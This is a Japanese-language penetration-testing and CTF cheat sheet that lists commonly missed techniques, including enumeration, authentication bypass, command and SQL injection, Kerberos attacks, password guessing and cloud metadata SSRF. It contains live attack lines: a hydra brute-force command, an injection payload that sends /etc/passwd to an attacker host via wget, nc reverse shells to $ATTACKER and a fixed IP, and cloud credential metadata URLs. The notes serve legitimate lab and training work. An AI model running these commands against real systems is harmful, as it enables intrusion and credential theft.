# 見落としがちなこと

## 列挙

- ディレクトリを見つけたら再帰的に検索
- .php.bak などのバックアップファイルに注意

## 認証バイパス

- sqlmapで脆弱性が見つからないからと言って脆弱性がないとは限らない。[認証バイパスのペイロード](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/Auth_Bypass.txt)を試す価値はある。

```sh
hydra $TARGET http-post-form "/internal:username=^USER^&password=^PASS^:Invalid username or password." -L auth_bypass.txt -p pass -t 30 -s 5050
```

## コマンドインジェクション

- ブラインドインジェクションに注意（sleep, ping, curl などで確認）
- 画面に表示されている項目だけとは限らない（ファイルアップロード時のファイル名など）
- 画面上で特殊文字が消えているように見えても、実行時に消えているとは限らない
- ブラインドで 22, 53, 80, 443, 8080 ポートのアウトバウンドができない場合は、authorized_keys の書き込みを考える
- `wget+http://myip/$(cat+/etc/passwd)`
- スペースや + がフィルタリングされているとき、`${IFS}`を使う。`ls${IFS}/home`

## SQLインジェクション

- `' or 1=1-- -`のような非常に単純な脆弱性であっても、ごく原始的なフィルターが入っているだけでsqlmapは検出できなくなる。そのため手作業での確認も不可欠。

## Windows

- User-Agent をみて、Windowsのときだけ本来の処理をするようなサーバーがある。ブラウザ、Powershell、certutil のUser-Agentを見分ける場合もある。
- Windowsバイナリの解析は、オンラインのサンドボックス解析にアップロードするのが速い。DLLもモードを選べば解析可能。

## Kerberos

- SMBにファイルをアップロードできるとき、ResponderでNTLMハッシュを入手できる可能性がある。
- 認証情報を得たらケルベロースティング、bloodhound。
- パスワード変更は boodyAD

## ファイルアップロード

- Flask で、画像ファイルアップロードの画面でpyファイルをアップロードしたら実行されるというようなこともあった。

## RCE

- 更新権限のあるpyファイルがAPI呼び出し等のたびにロードされるのは任意コード実行のチャンス（表示文言が設定されているファイルなど）
- PHPからWebシェルを起動したらすぐに終了してしまうとき、powershellでラップするとよい場合がある。

```sh
powershell.exe c:\\windows\\temp\\nc.exe $ATTACKER 443 -e cmd.exe

# Linuxの場合はバックグラウンド実行
busybox nc 192.168.128.106 8888 -e sh&
```

## パスワード

- su が失敗しても、パスワードが違うとは限らない。SSH接続が成功する可能性がある。
- 複数のパスワードが見えているとき、法則性が無いか注目する。
- ユーザー名のリストだけがあるとき、ユーザー名＝パスワードを探すのも手。
- LDAPのdescription等に入っているパターン。
- werkzeug の堅牢なハッシュは、hashcatやjohnではなく、`from werkzeug.security import check_password_hash` でループを回す手もある。
- あるユーザーのパスワードがほかのユーザーでも有効（攻撃者が複数ユーザーを侵害したというストーリーで出てきた）
- NTLMハッシュリストがあるとき、無関係に見えるユーザーのハッシュと一致。
- Webで有効だった認証情報はそのままSSHで使える可能性もある。
- SSH接続が禁止されているのとパスワード間違いは判別が困難。SSH接続失敗してもsuが成功する可能性はある。
- seclists の1000行のパスワードより、250行程度のfasttrackの方がCTF的には成功しやすい。fasttrackには管理者が一時的な値として設定しがちな値が入っている。
- 見つかったパスワードから特殊文字を削除したものが正しいパスワードというパターンがあった。
- Webページの（Season + YYYY）からパスワードリストを作る。

```sh
echo 'spring2026' > base.txt
john --wordlist=base.txt --rules=best64 --stdout > b64.txt
john --wordlist=base.txt --rules=dive --stdout > dive.txt
```

## クラウド

- SSRFで、`http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance`, `http://169.254.170.2/v2/metadata` の2か所は確認。後者はAmazon ECS (Elastic Container Service)、あるいは AWS Fargate 上で動作している可能性が高い。
- メタデータにコンテナイメージの識別子が無いか？Publicリポジトリからダウンロード可能ではないか？

| AWS | Azure | Google Cloud |
|------|------|-------------|
| `http://169.254.169.254/latest/meta-data/` | `http://169.254.169.254/metadata/instance?api-version=...`<br>(`Metadata: true` ヘッダーが必要) | `http://metadata.google.internal/`<br>(`Metadata-Flavor: Google` ヘッダーが必要) |

## 脆弱性検索

- 例えば、`user-role-editor`というプラグインがあるとき、そのまま検索したら何も出ず、`user role editor` で検索したら出てくるというようなことがある。

## https

- 証明書を確認するときは、Burpを通さない（表示される情報が減ることがある）
- httpだと無反応なポートが、httpsだとページが表示されることもある

## AI

- Web以外にオープンしているポートがあったら、LLMのポートかどうか確認が必要。種類によって特定のパスで列挙が可能。
